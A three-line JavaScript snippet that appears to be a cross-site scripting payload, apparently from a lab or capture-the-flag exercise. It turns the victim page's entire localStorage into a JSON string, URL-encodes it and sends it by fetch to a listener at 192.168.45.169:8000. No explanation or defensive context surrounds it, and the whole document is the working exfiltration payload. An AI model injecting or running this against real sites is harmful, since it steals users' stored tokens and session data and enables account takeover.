let data = JSON.stringify(localStorage)

let encodedData = encodeURIComponent(data)

fetch("http://192.168.45.169:8000/?localStorage=" + encodedData)
